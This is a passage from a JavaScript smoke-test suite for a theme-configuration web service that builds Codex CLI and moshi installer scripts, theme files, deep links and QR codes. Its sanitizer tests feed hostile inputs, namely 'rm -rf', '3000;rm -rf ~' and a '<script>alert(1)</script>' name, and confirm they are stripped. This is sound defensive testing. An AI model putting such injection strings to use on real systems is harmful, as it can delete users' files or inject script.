  // Preview/install parity: /codex-files.txt IS the installer's [tui] block.
  const cxPayload = Buffer.from(JSON.stringify({
    n: 'T', p: { bg: [46, 52, 64], text: [216, 222, 233], comment: [97, 110, 136], accent: [136, 192, 208] },
    cx: { on: true, theme: 'nope', statusLine: ['git-branch'], pet: 'rocky' },
  })).toString('base64url');
  r = await call('/codex-files.txt?c=' + cxPayload);
  const cxSan2 = CX.sanitizeCodex({ on: true, theme: 'nope', statusLine: ['git-branch'], pet: 'rocky' });
  const cxExpect = CX.buildCodexTomlLines(cxSan2).map(kv => kv[0] + ' = ' + kv[1]).join('\n') + '\n';
  ok(r.status === 200 && r.body === cxExpect,
    '/codex-files.txt is byte-identical to what the installer merges');
  const cxShown = fs.readFileSync(path.join(TMP, 'codex.sh'), 'utf8');
  ok(cxShown.includes(CX.buildCodexTomlLines(cxOn).map(kv => kv[0] + ' = ' + kv[1]).join('\n')),
    'codex: the installer heredoc carries the same lines the preview shows');
  r = await call('/apply.sh?c=' + cxPayload);
  ok(r.status === 200 && /Codex CLI/.test(r.body) && /SCC_CODEX_PY/.test(r.body),
    'a studio payload that carries a cx layer still applies it through the combined apply.sh');

  // ── the standalone editor: custom colours, new keys, its own installer ────────
  // The custom set becomes a REAL .tmTheme keyed by FILE STEM — verified in
  // codex-rs/tui/src/render/highlight.rs at tag rust-v0.147.0: custom_theme_path()
  // joins $CODEX_HOME/themes/<name>.tmTheme from the tui.theme value directly.
  const cxCust = CX.sanitizeCodex({
    on: true,
    custom: { on: true, name: '  Neon <Nights>!! ', fg: '#E0DEF4', com: '#6e6a86',
      kw: '#c4a7e7', kw2: 'rm -rf', str: '#f6c177', fn: '#9ccfd8', num: '#ebbcba' },
    rawOutput: true, resumeCwd: 'nonsense',
  });
  ok(cxCust.custom.name === 'Neon Nights' && cxCust.custom.fg === '#e0def4'
    && cxCust.custom.kw2 === CX.CODEX_DEFAULTS.custom.kw2 && cxCust.resumeCwd === '',
    'codex: hostile custom name/colours/enums all sanitize', JSON.stringify(cxCust.custom));
  ok(CX.customStem(cxCust) === 'neon-nights', 'codex: the stem is derived from the name');
  const cxCustLines = Object.fromEntries(CX.buildCodexTomlLines(cxCust));
  ok(cxCustLines.theme === '"neon-nights"' && cxCustLines.raw_output_mode === 'true'
    && !('resume_cwd' in cxCustLines),
    'codex: custom mode pins theme to the stem; unset resume_cwd emits no line');
  ok(Object.fromEntries(CX.buildCodexTomlLines(CX.sanitizeCodex({ on: true, resumeCwd: 'session' }))).resume_cwd === '"session"',
    'codex: a chosen resume_cwd emits its line');
  // The generated theme file is a real plist with the right rules — python is already
  // a dependency of the layer, so it is also the validator.
  const tmCheck = cp.spawnSync('python3', ['-c', [
    'import plistlib,sys,json',
    `t = plistlib.loads(${JSON.stringify(CX.buildCodexTmTheme(cxCust))}.encode())`,
    'rules = {x["name"]: x["settings"]["foreground"] for x in t["settings"] if "scope" in x}',
    'print(json.dumps([t["name"], t["settings"][0]["settings"]["foreground"], rules["Strings"], len(rules)]))',
  ].join('\n')], { encoding: 'utf8' });
  ok(tmCheck.status === 0 && tmCheck.stdout.trim() === '["neon-nights", "#e0def4", "#f6c177", 6]',
    'codex: the generated .tmTheme is a valid plist with the six rules',
    tmCheck.stdout.trim() || (tmCheck.stderr || '').slice(0, 120));
  // The installer writes the theme file next to the merge, and the config points at it.
  const cxCustHome = path.join(TMP, 'codexcust');
  fs.mkdirSync(cxCustHome, { recursive: true });
  const cxCustSh = path.join(TMP, 'codex-custom.sh');
  fs.writeFileSync(cxCustSh, '#!/bin/bash\nset -euo pipefail\n' + CX.codexApplyBlock(cxCust) + '\n');
  ok(bash(cxCustSh, cxCustHome).status === 0, 'codex: the custom-colour install runs clean');
  const tmOnDisk = cp.spawnSync('python3', ['-c', [
    'import plistlib,tomllib,json',
    `t = plistlib.load(open(${JSON.stringify(path.join(cxCustHome, '.codex', 'themes', 'neon-nights.tmTheme'))}, "rb"))`,
    `d = tomllib.load(open(${JSON.stringify(path.join(cxCustHome, '.codex', 'config.toml'))}, "rb"))`,
    'print(json.dumps([t["name"], d["tui"]["theme"]]))'].join('\n')], { encoding: 'utf8' });
  ok(tmOnDisk.status === 0 && tmOnDisk.stdout.trim() === '["neon-nights", "neon-nights"]',
    'codex: theme file written and config.toml points at its stem',
    tmOnDisk.stdout.trim() || (tmOnDisk.stderr || '').slice(0, 120));

  // ── the advanced keys ─────────────────────────────────────────
  const cxAdv = CX.sanitizeCodex({ on: true, notifMode: 'custom',
    notifEvents: ['approval-requested', 'made-up-event'], notifMethod: 'bel',
    reflowRows: 0, vimMode: true, altScreen: 'never',
    updateBanner: false, pasteBurst: false, rawReasoning: true, reasoningSummary: 'none' });
  const advLines = Object.fromEntries(CX.buildCodexTomlLines(cxAdv));
  ok(advLines.notifications === '["approval-requested"]'
    && advLines.notification_method === '"bel"' && advLines.alternate_screen === '"never"'
    && advLines.vim_mode_default === 'true' && advLines.terminal_resize_reflow_max_rows === '0',
    'codex: advanced [tui] lines — custom notifications keep only real events; 0 reflow = keep all',
    JSON.stringify(advLines));
  ok(Object.fromEntries(CX.buildCodexTomlLines(CX.sanitizeCodex({ on: true }))).notifications === 'true'
    && !('terminal_resize_reflow_max_rows' in Object.fromEntries(CX.buildCodexTomlLines(CX.sanitizeCodex({ on: true })))),
    'codex: stock emits notifications = true and no reflow line (auto)');
  const advRoot = Object.fromEntries(CX.buildCodexRootLines(cxAdv));
  ok(advRoot.check_for_update_on_startup === 'false' && advRoot.disable_paste_burst === 'true'
    && advRoot.show_raw_agent_reasoning === 'true' && advRoot.model_reasoning_summary === '"none"',
    'codex: root lines emit only when non-stock — and all four here are');
  ok(CX.buildCodexRootLines(CX.sanitizeCodex({ on: true })).length === 0,
    'codex: stock emits no root lines at all');
  // Root surgery: replace an existing managed root key without touching neighbours
  // (a multi-line notify array among them), and remove it again on the way back.
  const cxRootHome = path.join(TMP, 'codexroot');
  fs.mkdirSync(path.join(cxRootHome, '.codex'), { recursive: true });
  const cxRootCfg = path.join(cxRootHome, '.codex', 'config.toml');
  fs.writeFileSync(cxRootCfg, [
    '# top comment', 'model = "gpt-5.6-sol"', 'check_for_update_on_startup = true',
    'notify = [', '  "some-command",', '  "turn-ended",', ']', '',
    '[features]', 'hooks = true', ''].join('\n'));
  const cxAdvSh = path.join(TMP, 'codex-adv.sh');
  fs.writeFileSync(cxAdvSh, '#!/bin/bash\nset -euo pipefail\n' + CX.codexApplyBlock(cxAdv) + '\n');
  ok(bash(cxAdvSh, cxRootHome).status === 0, 'codex: root-key install runs clean');
  const rootChk = py(`import tomllib,json
d = tomllib.load(open(${JSON.stringify(cxRootCfg)}, 'rb'))
print(json.dumps([d['check_for_update_on_startup'], d['model_reasoning_summary'],
  d['notify'], d['model'], d['features']['hooks'], d['tui']['vim_mode_default']]))`);
  ok(rootChk.status === 0
    && rootChk.stdout.trim() === '[false, "none", ["some-command", "turn-ended"], "gpt-5.6-sol", true, true]',
    'codex: root key replaced in place; multi-line notify, model and [features] untouched',
    rootChk.stdout.trim() || (rootChk.stderr || '').slice(0, 140));
  ok(/# top comment/.test(fs.readFileSync(cxRootCfg, 'utf8')), 'codex: root comments survive');
  ok(bash(cxNoPet, cxRootHome).status === 0
    && !/model_reasoning_summary|show_raw_agent_reasoning|disable_paste_burst|check_for_update/.test(fs.readFileSync(cxRootCfg, 'utf8')),
    'codex: back to stock removes every managed root key');

  // The page's own installer: codex only — no tweakcc, no Claude Code half.
  const cxOnlyPayload = Buffer.from(JSON.stringify({ cx: { on: true, pet: 'rocky' } })).toString('base64url');
  r = await call('/codex-apply.sh?c=' + cxOnlyPayload);
  ok(r.status === 200 && /SCC_CODEX_PY/.test(r.body) && !/tweakcc/.test(r.body) && !/claude/i.test(r.body.replace(/Claude Code are separate/, '')),
    '/codex-apply.sh applies codex and nothing else');
  ok(cp.spawnSync('bash', ['-n', (() => { const f = path.join(TMP, 'cxonly.sh'); fs.writeFileSync(f, r.body); return f; })()],
    { encoding: 'utf8' }).status === 0, '/codex-apply.sh parses as bash');
  r = await call('/codex-apply.sh?c=' + Buffer.from(JSON.stringify({ n: 'x' })).toString('base64url'));
  ok(r.status === 404, '/codex-apply.sh without a codex layer refuses');
  // files.txt carries the theme file for the preview, split on the marker.
  const cxCustPayload = Buffer.from(JSON.stringify({ cx: { on: true,
    custom: { on: true, name: 'Neon Nights', fg: '#e0def4', com: '#6e6a86', kw: '#c4a7e7',
      kw2: '#eb6f92', str: '#f6c177', fn: '#9ccfd8', num: '#ebbcba' } } })).toString('base64url');
  r = await call('/codex-files.txt?c=' + cxCustPayload);
  ok(r.status === 200 && r.body.includes('@@TMTHEME@@neon-nights.tmTheme@@')
    && r.body.split('@@TMTHEME@@')[1].includes('#f6c177'),
    '/codex-files.txt carries the generated theme file behind the marker');

  // The page itself.
  r = await call('/codex');
  const cxPage = r.body;
  for (const [needle, label] of [
    ['id="winBefore"', 'has the BEFORE window'],
    ['id="controls"', 'has the controls host (nav sections read from it)'],
    ['saneCodex', 'sanitizes the payload before rendering it'],
    ['id="fileToml"', 'previews the merged [tui] block'],
    // The chips are built client-side; the server ships the data they're built from.
    ['"dracula"', 'ships the real theme list'],
    ['"null-signal"', 'ships the real pet catalog'],
    ['A tidy duck for calm workspace days', 'pet blurbs are the binary’s own'],
    ['aborts if it doesn', 'says the merge aborts on an unparseable file'],
    ['id="compare"', 'has the comparison block'],
  ]) ok(cxPage.includes(needle), '/codex: ' + label);
  ok(/class="cmpcard here"[\s\S]{0,400}Codex/.test(cxPage), '/codex: comparison marks Codex');
  // The review's honesty fixes, pinned individually — a batch of them once silently
  // failed to apply and a combined grep hid it.
  for (const [needle, label] of [
    ['refresh._seq', 'the files preview cannot be overwritten by a stale response'],
    ['backs your file up, parses it', 'the panel states the real backup-then-parse order'],
    ["comments inside that one table don't survive", 'the [tui]-comments caveat is disclosed'],
    ["syntect's built-ins", 'the verified panel splits bat renders from tmTheme parses'],
    ['by file stem', 'the custom-theme resolution rule is stated with its source'],
    ['animated sprite the terminal draws', 'the pet tip claims no more than was verified'],
    ['renders its own separators', 'the title tip does not vouch for the separator'],
    ["no setting for", 'prompt recolouring is honestly called impossible'],
    ['cxstatus.flash', 'a status-line change flashes the row'],
    ['class="cxscroll"', 'the transcript clips from the top, keeping the status line visible'],
  ]) ok(cxPage.includes(needle), '/codex: ' + label);
  // The pairing is gone: codex and Claude Code are separate agents, neither hosts the
  // other, so no "+ Claude Code" pane, no recipe save, and no codex entry in recipes.
  for (const [needle, label] of [
    ['id="winClaude"', 'the "+ Claude Code" pane'],
    ['data-pane="claude"', 'the + Claude switch button'],
    // RECIPE_JS still defines the function (the palette picker lives there);
    // what must be gone is the CALL and its save card.
    ['installRecipeSave(payload', 'the recipe save call'],
    ['id="recsave"', 'the recipe save card'],
  ]) ok(!cxPage.includes(needle), '/codex: no ' + label + ' (either/or, not a pairing)');

  // The standalone editor's page contract.
  for (const [needle, label] of [
    ['codex-apply.sh?c=', 'the command is the codex-only installer'],
    ['id="cuMode"', 'the custom-colour mode switch'],
    ['id="cu_', 'the token colour pickers (built per role)'],
    ['data-ground="light"', 'the preview ground toggle'],
    ['id="fileTheme"', 'the theme-file preview box'],
    ['standalone editor', 'the header says what the page is'],
    ["'scc_codex_saved'", 'saved setups have a storage key'],
    ['Save this setup', 'the save card'],
    ['paintSaved', 'the saved-setups renderer'],
  ]) ok(cxPage.includes(needle), '/codex: has ' + label);
  ok(!cxPage.includes('id="ccTheme"'), '/codex: the palette picker is gone');
  ok(!cxPage.includes('/apply.sh?c='), '/codex: nothing points at the combined installer');
  // Every theme the picker offers has an extracted palette — a chip with no colours
  // would mean the generated table and the enum drifted apart.
  ok(CX.CODEX_THEMES.every(t => CX.CODEX_SYNTAX[t] && /^#[0-9a-f]{6}$/.test(CX.CODEX_SYNTAX[t].fg)),
    'codex: all 27 themes have extracted palettes with well-formed colours');
  ok(CX.CODEX_THEMES.length === 27, 'codex: exactly the 27 themes the binary picker offers');

  // ── the moshi layer ───────────────────────────────────────────
  // No host file to install: the app imports the theme via a deep link / QR /
  // clipboard string / .json file, all verified against the app bundle and the live
  // gallery. What CAN corrupt is the wire format — so it is pinned hard here.
  console.log('— moshi —');
  const MO = require(path.join(ROOT, 'api/_moshi.js'));
  ok(MO.sanitizeMoshi(null) === null && MO.sanitizeMoshi({ on: false }) === null,
    'moshi: off yields no layer');
  const moEvil = MO.sanitizeMoshi({ on: true,
    name: ' <script>alert(1)</script> "Neon" ', mode: 'blue',
    colors: { background: 'red', foreground: '#ABC', cursor: '#12345g' },
    gw: { scanPorts: '3000;rm -rf ~', usage: 'yes' } });
  ok(moEvil.name === 'scriptalert1script Neon' && moEvil.mode === 'dark'
    && moEvil.colors.foreground === '#aabbcc'
    && moEvil.colors.background === MO.MOSHI_DEFAULTS.colors.background
    && moEvil.gw.scanPorts === '' && moEvil.gw.usage === true,
    'moshi: hostile name/mode/colours/ports all sanitize', JSON.stringify(moEvil.name));
  // The wire format: byte-identical to the gallery's own encoding, and provably
  // URL-safe. Standard base64 emits '+' or '/' only from specific 3-byte windows;
  // this walks EVERY 3-byte window our sanitized JSON alphabet can produce and
  // asserts none of them can. Not a sample — the whole input space.
  {
    const ALPH = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 _-#,:"{}[]'.split('').map(c => c.charCodeAt(0));
    let bad = 0;
    for (const a of ALPH) for (const b of ALPH) for (const c of ALPH) {
      const e = Buffer.from([a, b, c]).toString('base64');
      if (e.includes('+') || e.includes('/')) bad++;
    }
    ok(bad === 0, 'moshi: base64 of the sanitized JSON alphabet can NEVER need URL-escaping'
      + ' (all ' + ALPH.length ** 3 + ' windows checked)', bad + ' bad windows');
  }
  const moSan = MO.sanitizeMoshi({ on: true, name: 'Neon Nights', mode: 'light',
    colors: { background: '#111318', red: '#ff5555' } });
  const moLink = MO.moshiDeepLink(moSan);
  ok(/^moshi:\/\/theme\?d=[A-Za-z0-9]+$/.test(moLink),
    'moshi: the deep link matches the bundle’s own matcher and needs no escaping');
  const moBack = JSON.parse(Buffer.from(
    moLink.split('d=')[1] + '='.repeat((4 - moLink.split('d=')[1].length % 4) % 4), 'base64').toString());
  ok(moBack.v === 1 && moBack.name === 'Neon Nights' && moBack.mode === 'light'
    && moBack.colors.background === '#111318' && moBack.colors.red === '#ff5555',
    'moshi: the deep link round-trips to the exact theme JSON');
  ok(MO.moshiClipboard(moSan).startsWith('moshi-theme:'),
    'moshi: the clipboard string carries the importer’s prefix');
  // The gallery starters are the app's own files — shape-check every one.
  const { MOSHI_STARTERS } = require(path.join(ROOT, 'api/_moshi_starters.js'));
  ok(Object.keys(MOSHI_STARTERS).length >= 8, 'moshi: the starter set is vendored');
  for (const [slug, t] of Object.entries(MOSHI_STARTERS)) {
    ok(t.v === 1 && ['dark', 'light'].includes(t.mode)
      && /^#[0-9a-f]{6}$/i.test(t.colors.background) && /^#[0-9a-f]{6}$/i.test(t.colors.foreground),
      'moshi starter ' + slug + ': gallery shape intact');
  }
  // The gw script: CLI-only, exact commands, nothing when stock.
  ok(MO.moshiApplyScript('https://x', MO.sanitizeMoshi({ on: true })) === null,
    'moshi: a stock gw emits no script at all');
  const moGw = MO.sanitizeMoshi({ on: true, gw: { usage: false, scanPorts: '3000,5173' } });
  ok(MO.moshiGwCommands(moGw).join('|') ===
    'moshi-hook set usage-collection off|moshi-hook set scan-ports 3000,5173',
    'moshi: gw commands are exactly the CLI’s own verbs');
  const moShF = path.join(TMP, 'moshi.sh');
  fs.writeFileSync(moShF, MO.moshiApplyScript('https://x', moGw));
  ok(cp.spawnSync('bash', ['-n', moShF], { encoding: 'utf8' }).status === 0,
    'moshi: the gw script parses as bash');
  // The QR module: structural pins + a frozen vector. The full Vision-decode gate
  // lives in tools/verify-qr.swift and ran against 16 payloads incl. v40 max.
  const QR = require(path.join(ROOT, 'api/_qr.js'));
  const moQ = QR.qrMatrix(moLink);
  ok(moQ.size === moQ.modules.length && (moQ.size - 17) % 4 === 0,
    'moshi: the QR matrix is a legal size', moQ.size + '');
  const finder = m => m.modules[0].slice(0, 7).join('') === '1111111';
  ok(finder(moQ), 'moshi: finder pattern present');
  ok(/^<svg[^>]*viewBox/.test(QR.qrSvg('moshi://theme?d=abc')),
    'moshi: qrSvg emits a standalone SVG');
  const crypto = require('crypto');
  // Frozen when the encoder was Vision-verified: if this hash moves, the encoder's
  // output changed and the Vision gate (tools/verify-qr.swift) must be rerun.
  const frozen = crypto.createHash('sha256')
    .update(QR.qrMatrix('moshi://theme?d=eyJ2IjoxfQ').modules.map(r => r.join('')).join('\n'))
    .digest('hex').slice(0, 16);
  ok(frozen === '2362c23e1ca4dc59',
    'moshi: QR output matches the Vision-verified vector', frozen);
  // Routes.
  const moPayload = Buffer.from(JSON.stringify({ ms: { on: true, name: 'Route T', gw: { usage: false } } })).toString('base64url');
  r = await call('/moshi');
  ok(r.status === 200 && r.body.includes('id="qrimg"') && r.body.includes('scc_moshi_saved'),
    '/moshi renders with the QR image and saved setups');
  ok(!/\bccPayload\b/.test(r.body) && !r.body.includes("'/apply.sh?c="),
    '/moshi: standalone — no Claude Code payload, no combined installer');
  r = await call('/moshi-theme.json?c=' + moPayload);
  ok(r.status === 200 && JSON.parse(r.body).v === 1,
    '/moshi-theme.json serves the importable file');
  r = await call('/moshi-qr.svg?c=' + moPayload);
  ok(r.status === 200 && /^<svg/.test(r.body), '/moshi-qr.svg serves the code');
  r = await call('/moshi-apply.sh?c=' + moPayload);
  ok(r.status === 200 && /moshi-hook set usage-collection off/.test(r.body)
    && !/tweakcc/.test(r.body), '/moshi-apply.sh drives moshi-hook set and nothing else');
  r = await call('/moshi-apply.sh?c=' + Buffer.from(JSON.stringify({ n: 'x' })).toString('base64url'));
  ok(r.status === 404, '/moshi-apply.sh refuses a payload without the layer');

  console.log('— misc —');
  r = await call('/nope');
  ok(r.status === 404, '404 fallback');

  console.log('');
  console.log(failures ? '✗ ' + failures + ' FAILURE(S)' : '✓ all smoke tests passed');
  process.exit(failures ? 1 : 0);
})();
